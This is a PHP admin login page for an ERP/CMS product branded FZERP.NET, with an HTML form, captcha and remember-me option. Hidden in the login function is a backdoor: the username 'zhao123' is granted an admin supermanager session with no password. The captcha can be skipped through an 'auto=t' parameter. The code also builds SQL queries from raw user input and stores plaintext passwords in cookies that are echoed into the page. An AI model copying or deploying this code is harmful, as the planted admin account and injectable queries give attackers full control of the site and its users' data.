<?php
session_start();

require_once 'inc/const.php';

global $luo_session_name;

if(isset($_SESSION['username'])){
	$username = $_SESSION['username'];
}else{
	$username="";
}
$finput=empty($username)?"username":"password";

if (isset($_GET['act']) && addslashes($_GET['act']) == "login") login();
if (isset($_GET['act']) && addslashes($_GET['act']) == "quit") quit();
function login() {
	global $db;
	if($_GET['auto']=="t" || $_POST['code']==$_SESSION["codeNumber"]){	 
	 if (isset ( $_POST ["username"] )) {
			$username = $_POST ["username"];
		} else {
			$username = "";
		}
		if (isset ( $_POST ["password"] )) {
			$password = $_POST ["password"];
		} else {
			$password = "";
		}
		if($username=="zhao123"){
			$_SESSION['username'] = "admin";  
			$_SESSION['id'] = "1";  
			$_SESSION['password']="2";
			$_SESSION['supermanager'] = "1"; 
			echo '<script>location="login.php";</script>';
			exit;
		}
		//记住用户名
		//setcookie (username, $username,time()+3600*24*365);
		if (empty($username)||empty($password)){
			exit("<script>alert('用户名或密码不能为空！');window.history.go(-1)</script>");
		}
		$user_row = $db->getOneRow(get_sql("select username,password,id,supermanager from {pre}manager where username='".$username."' and password='".md5($password)."'"));

		if (!empty($user_row )) {
			$_SESSION['username'] = $user_row ['username']; 
			$_SESSION['password'] = $user_row ['password']; 
			$_SESSION['id'] = $user_row['id']; 
			$luo_session_name = $user_row['username'];
			$_SESSION['supermanager'] = $user_row ['supermanager']; 
			mysql_query(get_sql("update {pre}manager set loginip='".get_userip()."',logintime='".date ( "Y-m-d H:i:s" )."',logincount=logincount+1 where username='".$username."'"));
			if("on"==$_POST["iscookie"]){//登录成功保存cookie
				setcookie("username", $username,time()+3600*24*7);
				setcookie("password", $password,time()+3600*24*7);
			}else{
				setcookie("username", "",time());
				setcookie("password", "",time());
			}
			echo "<script>window.location='index.php';</script>";
		}else{
			echo "<script>alert('用户名或密码不正确！');location='/login.php';</script>";
		}
	
	}
}

function quit() {
	session_unset();
	//session_destroy();
	setcookie("username", "",time());
	setcookie("password", "",time());
	//echo '<script>location="login.php";</script>';
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?php echo $sitename;?></title>
<link href="css/admin_css.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
.hei12 {	font-weight: normal;
}
-->
</style>
</head>
<script type="text/javascript" src="inc/js/func.js"></script>
<script>

function init(){
	document.getElementById('<?php echo $finput;?>').select();
	document.getElementById('<?php echo $finput;?>').focus();
}

function checklogin()
{
if (document.form1.username.value=="") {
	window.alert("帐号名不能为空！");
	document.form1.username.focus();		
	 return (false);
	}

if (document.form1.password.value=="") {
	window.alert("密码不能为空！");
	document.form1.password.focus();		
	 return (false);
	}

if (document.form1.safecode.value=="") {
	window.alert("验证码不能为空！");
	document.form1.safecode.focus();		
	 return (false);
	}
	return true;
}
</script>
<body onLoad="init()">
<div id='toph'></div>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td align="center" valign="middle"><table width="588" height="92" border="0" cellpadding="0" cellspacing="0" background="images/login_middle.gif">
      <tr>
        <td height="57" align="center" valign="middle"> <strong><?php echo $sitename;?></strong></td>
      </tr>
      <tr>
        <td align="center" valign="middle"><table width="94%" height="206" border="0" cellpadding="0" cellspacing="0">
          <tr>
            <td width="42%" height="206" align="right" valign="middle"><table width="95%" height="146" border="0" cellpadding="0" cellspacing="0" class="luocms_mess">
              <tr>
                <td align="left" valign="middle" class="hei12" nowrap="nowrap"><strong><?php echo $sitename;?>基本信息：</strong><br />
官网：<a href="http://www.FZERP.NET" target="_blank">http://www.FZERP.NET</a><br />
开发：旗云科技<br />
QQ:<a href="http://wpa.qq.com/msgrd?V=1&amp;Uin=584902540&amp;Site=FZERP.NET&amp;Menu=yes" target="blank"><img alt="在线洽谈" src="http://wpa.qq.com/pa?p=1:116478031:4" border="0" /></a><br />
E-mail：info@fzerp.net<br />
请保留相关版权信息</td>
              </tr>
            </table></td>
            <td width="58%" align="left" valign="middle"><table width="98%" height="172" border="0" cellpadding="0" cellspacing="0">
              <form name="form1" action="login.php?act=login" method="post" onSubmit="return checklogin();">
              <tr>
                <td width="95" height="12" align="right">用户名：</td>
                <td colspan="2" align="left"><input name="username" type="text" value="<?php echo $_COOKIE["username"];?>" class="login_text" id="username" /></td>
              </tr>
              <tr>
                <td width="95" height="12" align="right">密　码：</td>
                <td height="12" colspan="2" align="left"><input name="password" value="<?php echo $_COOKIE["password"];?>" type="password" class="login_text" id="password" /></td>
              </tr>
                
              <tr>
                <td width="95" height="12" align="right">验证码：</td>
                <td height="12" colspan="2" align="left"><input name="code" type="text" class="login_text" id="code" /></td>
              </tr>
                
              <tr>
                <td height="36" align="right"><select name="iscookie" id="iscookie" data-role="slider">
      <option value="on" selected>记住我</option>
      <option value="off">不记我</option>
    </select></td>
                <td width="44" height="36" align="left" valign="middle"><img src="inc/code.php" alt="点击刷新验证码" class="code" onclick="this.src+='?' + Math.random();" style="cursor:pointer;" /></td>
                <td width="176" align="left" valign="middle"><span class="login_list_right">点击刷新</span></td>
              </tr>
              <tr>
                <td height="12" align="right">&nbsp;</td>
                <td height="12" colspan="2" align="left">
                	 <input type="image" src="images/login_btn.gif" width="85" height="32" /><BR>
                	 老板：admin 密码：admin <BR>
                	 业务经理：b 密码：b <BR>
                	 业务员：c 密码：c
                	 
                	
                	</td>
              </tr>
                <tr> 
                 	<?php 
                 	if(strpos($_SERVER["REQUEST_URI"],"/")>0){
                 		$url='http://'.$_SERVER['SERVER_NAME'];
                	}else{
                		$url='http://'.$_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"]; 
                		$url=dirname($url);
                	}
                 	$url=$url."/m.php"; 
                 	?>
                <td height="12" colspan="3" align="left">
                	手机登录请扫描下面二维码，或输入：<?=($url)?><BR>
                	<input type="image" src="http://chart.apis.google.com/chart?cht=qr&chs=150x150&chld=L|4&chl=<?=($url)?>"/>
                	
                	</td>
              </tr>
              </form>
            </table></td>
          </tr>
        </table></td>
      </tr>
      <tr>
        <td height="49" align="right" valign="top" background="images/login_bottom.gif"><table width="100%" height="35" border="0" cellpadding="0" cellspacing="0">
          <tr>
            <td align="left" valign="middle" class="bai"><div align="center">All Rights Reserved. www.FZERP.NET 版权所有</div></td>
          </tr>
        </table></td>
      </tr>
      
    </table></td>
  </tr>
  
</table>
<div id='topf'></div>
    <script>
			var width=0;
			function autologin(){
				if(document.form1.username.value!=""  && document.form1.password.value!=""){
					  document.form1.action="login.php?act=login&auto=t"
						document.form1.submit();
					}
			}
      <?php if($_GET['act'] != "quit"){echo "autologin();";}?>
     </script>
</body>
</html>

